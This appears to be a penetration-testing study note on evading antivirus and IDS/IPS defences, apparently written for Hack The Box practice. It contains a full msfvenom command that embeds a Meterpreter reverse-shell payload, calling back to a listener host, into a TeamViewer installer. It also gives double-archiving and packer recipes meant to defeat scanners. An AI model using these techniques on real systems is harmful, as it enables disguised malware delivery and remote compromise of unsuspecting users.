

# Firewall and IDS/IPS Evasion

To attack a system effectively and quietly, we must first understand **how it is defended**. Modern environments rely on multiple overlapping security layers designed to detect, block, or alert on malicious activity.

These defenses are broadly divided into two categories:

* **Endpoint Protection**
* **Perimeter Protection**

---

## 1. Endpoint Protection

Endpoint protection refers to **security mechanisms installed directly on a host** (workstation, server, or VM).

### Examples of Endpoints

* Personal computers
* Corporate workstations
* Web servers
* Database servers
* DMZ servers

### Typical Endpoint Protection Components

Endpoint security is usually delivered as a **single software suite**, which may include:

* Antivirus (AV)
* Anti-malware (spyware, ransomware, adware, etc.)
* Host-based firewall
* Anti-DDoS components
* Behavioral monitoring

### Common Products

* Avast
* ESET NOD32
* Malwarebytes
* Bitdefender
* Windows Defender

These tools primarily focus on **file scanning, memory inspection, and process monitoring**.

---

## 2. Perimeter Protection

Perimeter protection exists at the **edge of the network** and controls traffic between:

* The public internet
* Internal private networks

### Common Perimeter Devices

* Firewalls (hardware or virtual)
* IDS (Intrusion Detection Systems)
* IPS (Intrusion Prevention Systems)
* Unified Threat Management (UTM) devices
* Secure gateways

---

## 3. The DMZ (De-Militarized Zone)

Between external and internal networks, organizations often deploy a **DMZ**.

### DMZ Characteristics

* Hosts public-facing services (web, mail, VPN, etc.)
* Less trusted than internal networks
* More trusted than the internet
* Strictly monitored and filtered

Compromising a DMZ host does **not** mean full internal access, but it often provides a foothold.

---

## 4. Security Policies

All defensive systems rely on **security policies**, which are essentially **allow/deny rules**.

### Common Policy Categories

* Network traffic policies
* Application policies
* User access control policies
* File management policies
* DDoS mitigation policies

These policies decide:

* What traffic is allowed
* What files can execute
* Which users have access
* What behavior is considered malicious

---

## 5. Detection Mechanisms

Security systems match events against policies using several detection techniques.

### 1. Signature-Based Detection

* Compares traffic or files to known attack signatures
* Exact matches trigger alerts
* Very effective against known threats
* Weak against obfuscation and new attacks

### 2. Heuristic / Anomaly Detection

* Compares behavior against a baseline
* Detects deviations from “normal” activity
* Often used for APT detection

### 3. Stateful Protocol Analysis

* Verifies protocol behavior against RFC standards
* Detects malformed or suspicious protocol usage

### 4. SOC-Based Monitoring

* Human analysts monitor alerts in real time
* Can manually escalate or block threats
* Combines automation with human judgment

---

## 6. Why Simple Encoding Is Not Enough

Older AV engines relied heavily on static signatures. Today:

* Multiple encoding iterations alone do **not** guarantee evasion
* Modern AV can detect:

  * Shikata Ga Nai
  * Meterpreter stagers
  * Known Metasploit templates

Even establishing a reverse shell can raise alarms.

---

## 7. Meterpreter Network Evasion

Modern versions of Metasploit (MSF6) improve network evasion by:

* Encrypting Meterpreter communication using **AES**
* Tunneling traffic through encrypted channels
* Reducing visibility to network-based IDS/IPS

This helps bypass **network inspection**, but **does not solve file-based detection**.

---

## 8. The Real Problem: Payload on Disk

Before execution:

* Payloads may be scanned on disk
* AV engines fingerprint known Metasploit binaries
* Default payloads are commonly blocked

Solution: **Payload obfuscation and blending**

---

## 9. Executable Templates (Backdoored Executables)

MSFVenom allows embedding payloads into **legitimate executables**.

### Concept

* Inject shellcode into a real application
* Preserve original functionality
* Hide malicious code inside trusted software

This creates a **backdoored executable**.

### Example

```
msfvenom windows/x86/meterpreter_reverse_tcp \
LHOST=10.10.14.2 LPORT=8080 \
-k -x TeamViewer_Setup.exe \
-e x86/shikata_ga_nai -i 5 \
-a x86 --platform windows \
-o TeamViewer_Setup.exe
```

### Important Flags

* `-x` → executable template
* `-k` → keep normal program execution
* `-e` → encoder
* `-i` → encoding iterations

---

## 10. Archives as an Evasion Technique

### Why Archives Work

* Password-protected archives cannot be scanned
* AV flags them as “unscannable” instead of malicious
* Many systems allow them to pass through

### Downsides

* Generates alerts
* Requires user interaction
* Admins may manually inspect them

---

## 11. Double-Archiving + Extension Removal

Technique:

1. Archive payload with password
2. Remove archive extension
3. Archive again with password
4. Remove extension again

Result:

* Payload becomes opaque to scanners
* VirusTotal detection drops to zero in many cases

This is effective for **data exfiltration and payload transfer**, not execution.

---

## 12. Packers

A **packer** compresses and encrypts an executable and includes a runtime decompressor.

### Benefits

* Alters file structure
* Breaks static signatures
* Preserves original functionality

### Common Packers

* UPX
* Themida
* MPRESS
* Enigma Protector
* Morphine

Packers add another obfuscation layer **before execution**.

---

## 13. Exploit Coding Evasion

### Problem

Exploit code often contains:

* Repetitive patterns
* Predictable buffers
* Classic NOP sleds

IDS/IPS systems look for these patterns.

### Solutions

* Randomize buffer offsets
* Avoid obvious NOP sleds
* Introduce variation in payload placement

Example:

```ruby
'Targets' =>
[
  ['Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 }],
]
```

Randomization breaks known signatures.

---

## 14. Key Takeaways

* AV and IDS/IPS rely heavily on **signatures and behavior**
* Encoding alone is insufficient
* AES-encrypted Meterpreter helps against network inspection
* File-based detection is the biggest challenge
* Backdoored executables significantly reduce detection
* Archives and packers help with payload transfer
* Exploit code should avoid predictable patterns
* Evasion is situational and rarely guaranteed

---

## Final Note on Evasion

Evasion is a **vast and evolving topic**.

This section provides:

* Conceptual understanding
* Entry-level practical techniques

True evasion requires:

* Testing against real defenses
* Sandbox validation
* Custom tooling

Practicing on **older HTB machines or legacy AV environments** is highly recommended.

